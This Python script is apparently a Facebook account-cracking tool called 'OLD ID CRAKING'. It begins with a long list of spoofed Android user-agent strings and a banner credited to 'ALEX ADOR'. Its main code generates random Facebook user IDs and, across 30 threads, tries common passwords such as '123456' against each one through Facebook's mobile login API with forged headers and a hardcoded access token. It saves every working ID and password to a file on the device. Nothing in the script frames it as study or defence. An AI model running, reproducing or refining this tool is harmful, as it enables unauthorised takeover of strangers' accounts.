ua = ['Dalvik/2.1.0 (Linux; U; Android 5.1; Blade A465 Build/LMY47D)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 14; REA-AN00 Build/HONORREA-AN00)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 11; tc8000_ay30a2 Build/RQ3A.210705.001)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 12; S6003L Build/SP1A.210812.016)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 9; AFTEU014 Build/PS7652.3558N)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 13; HK1 RBOX K8S Build/TQ3C.230805.001.B2)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 14; SCG24 Build/UP1A.231005.007)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 10; HN55BYRA Build/BYR-350)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 9; K1MAX Build/PQ2A.190205.003)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 7.1.2; DS6 Build/N2G47H.1279)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 11; 4K SMART TV Build/RTM6.230109.231)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 5.1; X-TIGI_V1 Build/LMY47D)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 9; M401A Build/PPR1.180610.011)',]
ua = ["Dalvik/2.1.0 (Linux; U; Android 8.0.0; 7S77_P70 Build/OPR5.170623.014)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 9; AFTANNA0 Build/PS7659.4632N)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 7.1.2; X99.02.3.01.d32 Build/NHG47K)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 14; Pixel 7a Build/AP1A.240405.002)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 10; sdk_google_atv_x86 Build/QTU1.200805.001)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 11; GTX-98Q Build/RQ2A.210505.003)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 13; moto g stylus 5G (2022) Build/T2SDS33.75-38-3-3-5)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 13; moto e13 Build/TLA33.105-287)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 14; 22122RK93C Build/UP1A.231005.007)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 13; moto g stylus (2023) Build/T1THS33.75-12-6-5-7)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 13; HEY2-W19 Build/HONORHEY2-W19) SP-engine/2.92.0 baiduboxapp/13.54.0.10 (Baidu; P1 13) dumedia/7.48.0.37",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Pro Build/AP21.240305.005)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 12; NCO-AL00 Build/HUAWEINCO-AL00)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 11; jacuzzi Build/R122-15753.55.0)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 12; Lamtech Build/SP1A.210812.015)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 13; S41 Max Build/TP1A.220624.014)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 11; SHARK PRS-A0 Build/PROS2201111CN00MR1)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 11; AI PONT Build/RTM3.211215.117)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 9; M8S_PRO Build/PI)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 11; itel AndroidTV Build/RTK2.230523.018)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 10; X96QPRO_TM Build/QP1A.191105.004)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 9; SM-G965N Build/PQ3B.190801.04011457)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 7.1.2; TXCZ_B001 Build/NHG47K)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 9; UNT413A5_GD2 Build/PPR1.180610.011)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 13; Android Automotive SDK for arm64 Build/TAG1.230812.001.B6)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 9; NEXON X1 Build/PPR1.180610.011)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 9; S905x3 Build/PPR1.180610.011)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 9; E900V22C Build/PPR1.180610.011)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 9ro.build.version.security_patch=2018-08-05; UNT413A5_GD Build/PPR1.180610.011)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 12; V2221 Build/SP1A.210812.003_MOD2)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 11; Toshiba_TV Build/RP1A.200720.011)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 5.0.2; LG-AK495 Build/LRX22G)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 12; moto g51 5G Build/S2RYAS32.58-13-12-5-3-3)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 11; 4K SMART TV Build/RTM6.230109.088)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 12; SM-A217F Build/SP1A.210812.016) [FBAN/AudienceNetworkForAndroid;FBSN/Android;FBSV/12;FBAB/com.miniclip.carrom;FBAV/15.2.0;FBBV/931;FBVS/6.16.0;FBLC/en_GB",]
ua='RMX3191 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; Infinix X606B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-181-5) [FBAN/Orca-Android;FBAV/424.0.0.25.113;FBPN/com.facebook.orca;FBLC/en_US;FBBV/510343531;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBDV/moto g play - 2023;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1439};FB_FW/1",]
ua = ["Mozilla/5.0 (Linux; Android 11; Mi 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 13; M2103K19G Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/416.0.0.9.76;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/491071575;FBCR/JAZZTEL;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2103K19G;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.375,width=1080,height=2138};FB_FW/1;] FBBK/1",]
ua = ["Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",]
ua = ["Dalvik/2.1.0 (Linux; Android 10; POCOPHONE F1) [FBAN/MobileAdsManagerAndroid;FBAV/324.0.0.28.115;FBBV/464692125;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/en_US;FBMF/POCOPHONE;FBBF/Poco;FBDV/Poco F1;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; Redmi Note 8T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 7 MIUI/V10.3.6.0.PFGEUXM) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/182747450;FBCR/MASMOVIL;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 7;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1",]
ua = ["Mozilla/5.0 (Linux; Android 13; CPH2357) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.167 Mobile Safari/537.36",]
#----------------------------[DATE]-----------------------------------#

logo =""" 
 ░▒▓██████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░ 
                                                                
\033[34;1m[\033[1;37m≈\033[1;31m]\033[1;37m DEVELOPER   :  ALEX ADOR❤️🥵

\033[34;1m[\033[1;37m≈\033[1;31m]\033[1;37m FACEBOOK    :  ALEX ADOR❤️🥵

\033[34;1m[\033[1;37m≈\033[1;31m]\033[1;37m GITHUB      :  😈😈😈😈😈

\033[34;1m[\033[1;37m≈\033[1;31m]\033[1;37m VERSION     :  0.1

\033[34;1m[\033[1;37m≈\033[1;31m]\033[1;37m TOOL        :  \033[1;34mOLD ID CRAKING\033[1;32m

\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m OWNER     :  \033[1;91m\033[1;41m\033[1;33mYOUR'E DAD ALEX ADOR 2024\033[;0m\033[1;91m\033[1;92m\033[38;5;46m
\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m"""

print(logo)
uname =input('\033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m TYPE: MY DAD ALEX ADOR \033[1;91m: \033[1;35m')
def back():
	login()

loop,ok=0,0

class Hacker:
    def __init__(self) -> None:
      self.sex=""
    def main(self):
       self.clear()
       print("⋙ 1. Old Clone 2009-20014\n⋙ 2. Exit Menu");self.linex()
       self.frsc=input("⋙ Select : ")
       if self.frsc == "1":self.settings()
       else:exit("⋙ Thanks For Using My Tolls ❤️❤️!")
    def linex(self):print("---------------------------------------")
    def clear(self):cmd("clear");print(logo)
    def settings(self):
       self.clear();print("⋙ Example : 5000 7000 9000");self.linex()
       self.limit=int(input("⋙ Enter Creak Limit : "));self.user=[]
       for _ in range(self.limit):nmp = ''.join(rc(digits) for _ in range(10));self.user.append(nmp)
       with tred(max_workers=30) as kidz:
           total=str(len(self.user));self.clear()
           print("⋙ Total Uid : %s"%(total))
           print("⋙ DATA USER NOT ALLOW❌ONLY WIFI USER ");self.linex()
           for xd in self.user:
               uid=str("10000"+xd);pas=['123456','1234567','12345678','123456789']
               kidz.submit(self.cracker,uid,pas,total)
       print();self.linex();print("⋙ Cracking Complete \n⋙ Total OK : %s"%(ok))
       self.linex();input("⋙ Prees Enter To Exit ");exit()
    def cracker(self,uid,pas,tl):
       global loop,ok
       sys.stdout.write("\r\r⋙ FINDING 👉⋙ %s ⋙ success👍⋙ %s "%(loop,ok));sys.stdout.flush()
       try:
          for ps in pas:
              with requests.Session() as session:
                 headers={'x-fb-connection-bandwidth': str(rr(20000000,29999999)),'x-fb-sim-hni': str(rr(20000,40000)),'x-fb-net-hni': str(rr(20000,40000)),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent': self.ua(),'content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
              po=session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(ps)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",headers=headers).json()
              if "Please Confirm Email" in str(po):
                 print(f"\r\r⋙ ADOR✅OK💚 ⋙\033[0;32m {uid} | {ps} \033[0m");open("/sdcard/Hacker-old-ok.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
                 break
              elif "session_key" in po:
                 print(f"\r\r⋙ADOR❤️ OK 💚⋙\033[0;32m {uid} | {ps} \033[0m");open("/sdcard/Hacker-old-ok.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
                 break
              else:pass
          loop+=1
       except Exception as e:pass
    def ua(self):
       aa = "Dalvik/3.0.0 (Linux; U; Android 13.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/9.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
       return aa
Hacker().main()